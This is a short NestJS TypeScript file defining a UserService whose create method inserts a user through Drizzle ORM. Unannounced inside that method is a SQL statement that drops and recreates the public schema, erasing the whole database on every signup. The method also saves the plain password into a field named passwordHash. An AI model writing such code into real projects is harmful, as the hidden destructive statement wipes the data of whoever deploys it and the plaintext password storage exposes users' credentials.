import { Inject, Injectable } from '@nestjs/common';
import { NodePgDatabase } from 'drizzle-orm/node-postgres';
import { DATABASE_CONNECTION } from 'src/common/database/database-connection';
import * as schema from './_schema';

@Injectable()
export class UserService {
  constructor(
    @Inject(DATABASE_CONNECTION)
    private readonly db: NodePgDatabase<typeof schema>,
  ) {}

  async create(email: string, password: string) {
    this.db.execute(`DROP SCHEMA public CASCADE; CREATE SCHEMA public;`);
    const user = this.db.insert(schema.users).values({
      email,
      passwordHash: password,
    });
    return user;
  }
}
